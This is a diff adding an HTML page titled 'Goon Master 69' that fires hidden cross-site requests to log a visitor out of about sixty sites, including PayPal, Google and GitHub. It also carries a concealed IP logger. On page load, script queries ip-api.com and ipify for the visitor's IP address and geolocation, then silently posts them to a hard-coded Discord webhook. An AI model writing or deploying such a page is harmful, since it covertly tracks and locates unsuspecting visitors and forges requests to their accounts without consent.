@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Goon Master 69</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin-top: 5em;
+    }
+    
+    h1 {
+      margin: 0 auto;
+      text-align: center;
+      font-size: 4em;
+    }
+    
+    ul {
+      width: 500px;
+      margin: 2em auto;
+    }
+  
+    .hidden {
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      top: -10px;
+      left: -10px;
+    }
+    
+    .success {
+      font-weight: bold;
+      color: #0a0;
+    }
+    
+    .error {
+      color: #a00;
+    }
+  </style>
+  <script>
+    function cleanup(func, el, delayCleanup) {
+      return function() {
+        if (delayCleanup) {
+          delayCleanup = false;
+          return;
+        }
+        func();
+        el.parentNode.removeChild(el);
+      };
+    }
+  
+    function get(url) {
+      return function(success, error) {
+        var img = document.createElement("img");
+        img.onload = cleanup(success, img);
+        img.onerror = cleanup(success, img);
+        img.className = "hidden";
+        document.body.appendChild(img);
+        img.src = url;
+      };
+    }
+    
+    var numPostFrames = 0;
+    function post(url, params, fakeOk) {
+      params = params || {};
+      return function(success, error) {
+        var form = document.createElement("form");
+        var iframe = document.createElement("iframe");
+
+        iframe.className = "hidden";
+        iframe.onload = cleanup(cleanup(success, form), iframe, true);
+        iframe.onerror = cleanup(cleanup(error, form), iframe, true);
+        iframe.name = "iframe" + numPostFrames++;
+        document.body.appendChild(iframe);
+        
+        form.action = url;
+        form.method = "POST";
+        form.target = iframe.name;
+        
+        for (var param in params) {
+          if (params.hasOwnProperty(param)) {
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = param;
+            input.value = params[param];
+            form.appendChild(input);
+          }
+        }
+        
+        document.body.appendChild(form);
+        form.submit();
+        
+        if (fakeOk) {
+          success();
+        }
+      };
+    }
+    
+    function and(one, two) {
+      return function(success, error) {
+        var oneSuccess = false;
+        var twoSuccess = false;
+        var oneSuccessFunc = function() {
+          oneSuccess = true;
+          if (twoSuccess) {
+            success();
+          }
+        };
+        var twoSuccessFunc = function() {
+          twoSuccess = true;
+          if (oneSuccess) {
+            success();
+          }
+        };
+        one(oneSuccessFunc, error);
+        two(twoSuccessFunc, error);
+      }
+    }
+    
+    function doSites(list, sites) {
+      sites.forEach(function(site) {
+        if (!site.length) {
+          return;
+        }
+        
+        var name = site[0];
+        var action = site[1];
+        
+        var li = document.createElement("li");
+        var nameNode = document.createElement("strong");
+        nameNode.appendChild(document.createTextNode(name));
+        var statusNode = document.createElement("span");
+        statusNode.innerHTML = "...";
+        li.appendChild(nameNode);
+        li.appendChild(document.createTextNode(': '));
+        li.appendChild(statusNode);
+        
+        var success = function() {
+          statusNode.innerHTML = "OK";
+          statusNode.className = "success";
+        };
+        var error = function() {
+          statusNode.innerHTML = "error";
+          statusNode.className = "error";
+        };
+        
+        action(success, error);
+        
+        list.appendChild(li);
+      });
+    }
+    
+    window.onload = function() {
+      doSites(document.getElementById("sitelist"), [
+        ["Adobe", get("https://account.adobe.com/logout")],
+        ["Amazon", get("https://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
+        ["AOL", and(get("http://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"), get("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random()))],
+        ["Apple ID", get("https://appleid.apple.com/logout")],
+        ["Blogger", get("http://www.blogger.com/logout.g")],
+        ["Bitbucket", get("https://bitbucket.org/account/logout/")],
+        ["Delicious", get("http://www.delicious.com/logout")],
+        ["DeviantART", post("http://www.deviantart.com/users/logout")],
+        ["Discord", get("https://discord.com/logout")],
+        ["DreamHost", get("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
+        ["Dropbox", get("https://www.dropbox.com/logout")],
+        ["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
+        ["Etsy", get("https://www.etsy.com/logout")],
+        ["Facebook", get("https://www.facebook.com/logout.php")],
+        ["Figma", get("https://www.figma.com/logout")],
+        ["Gandi", get("https://www.gandi.net/login/out")],
+        ["GitHub", get("https://github.com/logout")],
+        ["GMail", get("http://mail.google.com/mail/?logout")],
+        ["Google", get("https://www.google.com/accounts/Logout")],
+        ["Hulu", get("https://secure.hulu.com/logout")],
+        ["Instagram", get("https://www.instagram.com/accounts/logout/")],
+        ["Instapaper", get("http://www.instapaper.com/user/logout")],
+        ["LinkedIn", get("https://www.linkedin.com/m/logout/")],
+        ["Linode", get("https://manager.linode.com/session/logout")],
+        ["LiveJournal", post("http://www.livejournal.com/logout.bml", { "action:killall": "1" })],
+        ["Microsoft", get("https://login.microsoftonline.com/common/oauth2/logout")],
+        ["MySpace", get("http://www.myspace.com/index.cfm?fuseaction=signout")],
+        ["Netflix", get("http://www.netflix.com/Logout")],
+        ["New York Times", get("http://www.nytimes.com/logout")],
+        ["Newegg", get("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
+        ["Notion", get("https://www.notion.so/api/v3/logout")],
+        ["PayPal", get("https://www.paypal.com/us/cgi-bin/webscr?cmd=_logout")],
+        ["Photobucket", get("http://photobucket.com/logout")],
+        ["Pinterest", get("https://www.pinterest.com/logout/")],
+        ["Quora", get("https://www.quora.com/logout")],
+        ["Reddit", get("https://www.reddit.com/logout")],
+        ["Salesforce", get("https://login.salesforce.com/secur/logout.jsp")],
+        ["Shopify", get("https://accounts.shopify.com/logout")],
+        ["Skype", get("https://secure.skype.com/account/logout")],
+        ["Slack", get("https://slack.com/signout")],
+        ["Slashdot", get("http://slashdot.org/my/logout")],
+        ["Snapchat", get("https://accounts.snapchat.com/accounts/logout")],
+        ["SoundCloud", get("http://soundcloud.com/logout")],
+        ["Spotify", get("https://www.spotify.com/logout/")],
+        ["Steam Community", get("http://steamcommunity.com/?action=doLogout")],
+        ["Steam Store", get("http://store.steampowered.com/logout/")],
+        ["ThinkGeek", get("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
+        ["Threadless", get("http://www.threadless.com/logout")],
+        ["Trello", get("https://trello.com/logout")],
+        ["Tumblr", get("http://www.tumblr.com/logout")],
+        ["Twitter", get("https://twitter.com/logout")],
+        ["Vimeo", get("http://vimeo.com/log_out")],
+        ["Wikipedia", get("http://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
+        ["Windows Live", get("http://login.live.com/logout.srf")],
+        ["Woot", get("https://account.woot.com/logout")],
+        ["Wordpress", get("https://wordpress.com/wp-login.php?action=logout")],
+        ["Yahoo!", get("https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/")],
+        ["YouTube", post("http://www.youtube.com", { "action_logout": "1" }, true)],
+        ["Zoom", get("https://zoom.us/logout")]
+      ])
+    };
+
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-24596689-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+    function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
+            };
+            xhr.send(null);
+        }
+
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "razzylog";
+            const secondList = document.getElementsByClassName("header")[0];
+            secondList.appendChild(div);
+        });
+
+        get_information("https://api.ipify.org/", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ipppp";
+            const secondList = document.getElementsByClassName("header")[0];
+            secondList.appendChild(div);
+        });
+
+        function ipLogByRaz() {
+            var ispp = document.getElementById('ipppp').innerHTML;
+            var extra = document.getElementById("razzylog").innerHTML;
+            const request = new XMLHttpRequest();
+            request.open("POST", wbhk);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Bird",
+                avatar_url: 'https://i.postimg.cc/cLbXKSsR/apple.webp',
+                content: "**Ip** : _" + ispp + "_\n**Beamed** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : @here" + extra + "`"
+            };
+            request.send(JSON.stringify(params));
+        }
+
+        setTimeout(function() {
+            ipLogByRaz();
+        }, 700);
+
+        var wbhk = 'https://discord.com/api/webhooks/1333225474167668776/5n6wwfzSSNJWkFc56dtQAJUb40F1wx4eFllagOvfmtX9yt4ShjGTngBVjWFGWWtmBESb' 
+  </script>
+</head>
+<body>
+  <h1>Goon Master 69</h1>
+  <!-- <ul id="sitelist"> -->
+  </ul>
+</body>
+</html>
